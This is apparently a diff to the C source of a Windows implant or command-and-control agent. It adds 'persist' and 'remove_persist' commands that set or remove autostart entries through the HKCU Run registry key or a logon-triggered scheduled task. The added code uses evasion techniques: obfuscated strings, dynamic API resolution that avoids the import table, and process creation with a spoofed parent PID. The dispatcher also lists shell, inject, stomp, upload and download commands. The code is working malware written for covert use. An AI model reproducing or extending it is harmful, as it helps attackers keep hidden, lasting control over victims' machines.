@@ -647,23 +647,203 @@ static AgentResult *CmdStomp(const AgentCommand *cmd) {
     return MakeResult(cmd, 1, 0, ImplantStrDup("stomped"));
 }
 
+/* ── persist ─────────────────────────────────────────────────────────────────
+ *
+ * Two methods:
+ *   "reg"     — HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+ *               Requires: advapi32!RegOpenKeyExA + RegSetValueExA
+ *   "schtask" — schtasks.exe /Create  (shell child process)
+ *
+ * Args JSON: { "method": "reg"|"schtask", "name": "<key/task name>",
+ *              "path": "<optional exe path; defaults to own image>" }
+ */
+static AgentResult *CmdPersist(const AgentCommand *cmd) {
+    char *method = JsonGetStr(cmd->args_json, "method");
+    char *name   = JsonGetStr(cmd->args_json, "name");
+    char *path   = JsonGetStr(cmd->args_json, "path");
+
+    if (!method || !name || !name[0]) {
+        ImplantFree(method); ImplantFree(name); ImplantFree(path);
+        return ErrorResult(cmd, "missing method or name");
+    }
+
+    /* Resolve own executable path if not provided */
+    char exePath[PATH_MAX_C] = {0};
+    if (path && path[0]) {
+        xsnprintf(exePath, sizeof(exePath), "%s", path);
+    } else {
+        WCHAR wExe[PATH_MAX_C] = {0};
+        GetModuleFileNameW(NULL, wExe, PATH_MAX_C);
+        WstrToStr(wExe, exePath, PATH_MAX_C);
+    }
+    ImplantFree(path);
+
+    AgentResult *result = NULL;
+
+    if (strcmp(method, "reg") == 0) {
+        /* Registry Run key — dynamic advapi32 resolution (no static IAT) */
+        typedef LONG (WINAPI *pfnRegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
+        typedef LONG (WINAPI *pfnRegSetValueExA_t)(HKEY, LPCSTR, DWORD, DWORD,
+                                                    const BYTE *, DWORD);
+        typedef LONG (WINAPI *pfnRegCloseKey_t)(HKEY);
+
+        HMODULE adv = g_LoadLibraryA(OBFSTR("advapi32.dll"));
+        if (!adv) {
+            result = ErrorResult(cmd, "advapi32 unavailable");
+            goto done;
+        }
+
+        pfnRegOpenKeyExA_t  pOpen  = (pfnRegOpenKeyExA_t)(FARPROC)
+            g_GetProcAddress(adv, OBFSTR("RegOpenKeyExA"));
+        pfnRegSetValueExA_t pSet   = (pfnRegSetValueExA_t)(FARPROC)
+            g_GetProcAddress(adv, OBFSTR("RegSetValueExA"));
+        pfnRegCloseKey_t    pClose = (pfnRegCloseKey_t)(FARPROC)
+            g_GetProcAddress(adv, OBFSTR("RegCloseKey"));
+
+        if (!pOpen || !pSet || !pClose) {
+            result = ErrorResult(cmd, "reg API unavailable");
+            goto done;
+        }
+
+        HKEY hKey = NULL;
+        LONG rc = pOpen((HKEY)0x80000001 /* HKCU */,
+                        OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+                        0, 0x0002 /* KEY_SET_VALUE */, &hKey);
+        if (rc != 0 || !hKey) {
+            result = ErrorResult(cmd, "RegOpenKeyEx failed");
+            goto done;
+        }
+
+        rc = pSet(hKey, name, 0, 1 /* REG_SZ */,
+                  (const BYTE *)exePath, (DWORD)(strlen(exePath) + 1));
+        pClose(hKey);
+
+        result = (rc == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("reg persist set"))
+                           : ErrorResult(cmd, "RegSetValueEx failed");
+
+    } else if (strcmp(method, "schtask") == 0) {
+        /* Scheduled task via schtasks.exe */
+        char taskCmd[PATH_MAX_C * 2];
+        xsnprintf(taskCmd, sizeof(taskCmd),
+                  "schtasks /Create /F /SC ONLOGON /TN \"%s\" /TR \"%s\"",
+                  name, exePath);
+
+        char full[PATH_MAX_C * 2 + 16];
+        xsnprintf(full, sizeof(full), "cmd.exe /C %s", taskCmd);
+
+        HANDLE hProc = NULL, hThr = NULL;
+        BOOL ok = _CreateProcessWithPPID(full, &hProc, &hThr, NULL, NULL);
+        if (ok) {
+            WaitForSingleObject(hProc, 10000);
+            DWORD ec = 1;
+            GetExitCodeProcess(hProc, &ec);
+            CloseHandle(hThr);
+            CloseHandle(hProc);
+            result = (ec == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("schtask persist set"))
+                               : ErrorResult(cmd, "schtasks returned error");
+        } else {
+            result = ErrorResult(cmd, "CreateProcess failed");
+        }
+
+    } else {
+        result = ErrorResult(cmd, "unknown method (use reg or schtask)");
+    }
+
+done:
+    ImplantFree(method);
+    ImplantFree(name);
+    return result;
+}
+
+/* ── remove_persist ──────────────────────────────────────────────────────── */
+
+static AgentResult *CmdRemovePersist(const AgentCommand *cmd) {
+    char *method = JsonGetStr(cmd->args_json, "method");
+    char *name   = JsonGetStr(cmd->args_json, "name");
+
+    if (!method || !name || !name[0]) {
+        ImplantFree(method); ImplantFree(name);
+        return ErrorResult(cmd, "missing method or name");
+    }
+
+    AgentResult *result = NULL;
+
+    if (strcmp(method, "reg") == 0) {
+        typedef LONG (WINAPI *pfnRegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
+        typedef LONG (WINAPI *pfnRegDeleteValueA_t)(HKEY, LPCSTR);
+        typedef LONG (WINAPI *pfnRegCloseKey_t)(HKEY);
+
+        HMODULE adv = g_LoadLibraryA(OBFSTR("advapi32.dll"));
+        if (!adv) { result = ErrorResult(cmd, "advapi32 unavailable"); goto rdone; }
+
+        pfnRegOpenKeyExA_t   pOpen  = (pfnRegOpenKeyExA_t)(FARPROC)
+            g_GetProcAddress(adv, OBFSTR("RegOpenKeyExA"));
+        pfnRegDeleteValueA_t pDel   = (pfnRegDeleteValueA_t)(FARPROC)
+            g_GetProcAddress(adv, OBFSTR("RegDeleteValueA"));
+        pfnRegCloseKey_t     pClose = (pfnRegCloseKey_t)(FARPROC)
+            g_GetProcAddress(adv, OBFSTR("RegCloseKey"));
+
+        if (!pOpen || !pDel || !pClose) { result = ErrorResult(cmd, "reg API unavailable"); goto rdone; }
+
+        HKEY hKey = NULL;
+        LONG rc = pOpen((HKEY)0x80000001,
+                        OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+                        0, 0x0002, &hKey);
+        if (rc != 0 || !hKey) { result = ErrorResult(cmd, "RegOpenKeyEx failed"); goto rdone; }
+
+        rc = pDel(hKey, name);
+        pClose(hKey);
+        result = (rc == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("reg persist removed"))
+                           : ErrorResult(cmd, "RegDeleteValue failed");
+
+    } else if (strcmp(method, "schtask") == 0) {
+        char taskCmd[PATH_MAX_C + 64];
+        xsnprintf(taskCmd, sizeof(taskCmd),
+                  "cmd.exe /C schtasks /Delete /F /TN \"%s\"", name);
+
+        HANDLE hProc = NULL, hThr = NULL;
+        BOOL ok = _CreateProcessWithPPID(taskCmd, &hProc, &hThr, NULL, NULL);
+        if (ok) {
+            WaitForSingleObject(hProc, 10000);
+            DWORD ec = 1;
+            GetExitCodeProcess(hProc, &ec);
+            CloseHandle(hThr);
+            CloseHandle(hProc);
+            result = (ec == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("schtask removed"))
+                               : ErrorResult(cmd, "schtasks delete returned error");
+        } else {
+            result = ErrorResult(cmd, "CreateProcess failed");
+        }
+
+    } else {
+        result = ErrorResult(cmd, "unknown method (use reg or schtask)");
+    }
+
+rdone:
+    ImplantFree(method);
+    ImplantFree(name);
+    return result;
+}
+
 /* ── Dispatcher ──────────────────────────────────────────────────────────── */
 
 AgentResult *ExecuteCommand(const AgentCommand *cmd) {
     if (!cmd || !cmd->type[0]) return NULL;
 
-    if (strcmp(cmd->type, "shell")   == 0) return CmdShell(cmd);
-    if (strcmp(cmd->type, "ps")      == 0) return CmdPS(cmd);
-    if (strcmp(cmd->type, "cd")      == 0) return CmdCD(cmd);
-    if (strcmp(cmd->type, "sleep")   == 0) return CmdSleep(cmd);
-    if (strcmp(cmd->type, "kill")    == 0) return CmdKill(cmd);
-    if (strcmp(cmd->type, "ppid")    == 0) return CmdPPID(cmd);
-    if (strcmp(cmd->type, "getpid")  == 0) return CmdGetPID(cmd);
-    if (strcmp(cmd->type, "whoami")  == 0) return CmdWhoami(cmd);
-    if (strcmp(cmd->type, "inject")  == 0) return CmdInject(cmd);
-    if (strcmp(cmd->type, "stomp")   == 0) return CmdStomp(cmd);
-    if (strcmp(cmd->type, "ul")      == 0) return CmdUpload(cmd);
-    if (strcmp(cmd->type, "dl")      == 0) return CmdDownload(cmd);
+    if (strcmp(cmd->type, "shell")          == 0) return CmdShell(cmd);
+    if (strcmp(cmd->type, "ps")             == 0) return CmdPS(cmd);
+    if (strcmp(cmd->type, "cd")             == 0) return CmdCD(cmd);
+    if (strcmp(cmd->type, "sleep")          == 0) return CmdSleep(cmd);
+    if (strcmp(cmd->type, "kill")           == 0) return CmdKill(cmd);
+    if (strcmp(cmd->type, "ppid")           == 0) return CmdPPID(cmd);
+    if (strcmp(cmd->type, "getpid")         == 0) return CmdGetPID(cmd);
+    if (strcmp(cmd->type, "whoami")         == 0) return CmdWhoami(cmd);
+    if (strcmp(cmd->type, "inject")         == 0) return CmdInject(cmd);
+    if (strcmp(cmd->type, "stomp")          == 0) return CmdStomp(cmd);
+    if (strcmp(cmd->type, "ul")             == 0) return CmdUpload(cmd);
+    if (strcmp(cmd->type, "dl")             == 0) return CmdDownload(cmd);
+    if (strcmp(cmd->type, "persist")        == 0) return CmdPersist(cmd);
+    if (strcmp(cmd->type, "remove_persist") == 0) return CmdRemovePersist(cmd);
 
     char msg[64];
     xsnprintf(msg, sizeof(msg), "unknown command: %s", cmd->type);
